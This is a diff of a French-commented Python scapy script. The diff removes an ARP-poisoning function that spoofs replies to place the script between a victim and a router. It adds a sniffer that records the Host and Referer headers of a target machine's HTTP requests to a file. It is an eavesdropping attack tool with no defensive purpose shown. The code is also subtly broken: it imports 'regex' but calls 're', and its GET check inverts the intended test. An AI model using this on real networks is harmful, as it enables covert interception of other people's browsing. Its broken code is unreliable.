@@ -2,33 +2,35 @@
 # coding: utf-8
 
 from scapy.all import*
+import regex 
 
-## Create a Packet Count var
-packetCount = 0
+listeAddresse = []
 
-def poison(routerIP, victimIP, routerMAC, victimMAC):
-    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
-    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
- 
-def ecoute():
-	while 1:
-		#poison('192.168.0.1','192.168.0.107','AC:F1:DF:64:30:FC','24:0A:64:63:BF:65')
-		rep = sniff(filter="arp and host 192.168.0.111", timeout=2, count=10)
-		time.sleep(1.5)
-		rep.show()	
-	
-ecoute()
+def http_header(packet):
+    fichier = open("capture.txt", "w")
+    http_packet=str(packet)
+    if http_packet.find('GET'):
+        ret = "\n".join(packet.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
+        host = re.search('[Hh]ost: ', ret)
+        if host:
+            hostStg = ret.split('Host: ', 1)[1]
+            #Add pour récuperer l'adresse web du serveur
+            add = hostStg.split('\n', 1)[0]
+            url = re.search('Referer: ', hostStg)
+            if url:
+                adu = hostStg.split('Referer: ', 1)[1]
+                addurl = adu.split('\n', 1)[0]
+                if not(("Addresse exacte : " + addurl) in listeAddresse):
+                    listeAddresse.append("Addresse exacte : " + addurl)
+            else: 
+                if not(("Serveur : " + add) in listeAddresse):
+                    listeAddresse.append("Serveur : " + add)
+    for i in range(len(listeAddresse)):
+        fichier.write(listeAddresse[i] + "\n")
+    fichier.close()
 
+def main():
+    sniff(filter="host 192.168.0.2", prn=http_header)
+    
 
-    """
-        if http_packet.find('GET'):
-                return GET_print(packet)
-    """
-
-"""
-def GET_print(packet1):
-    ret = "***************************************GET PACKET****************************************************\n"
-    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
-    ret += "*****************************************************************************************************\n"
-    return ret
-"""
+main()
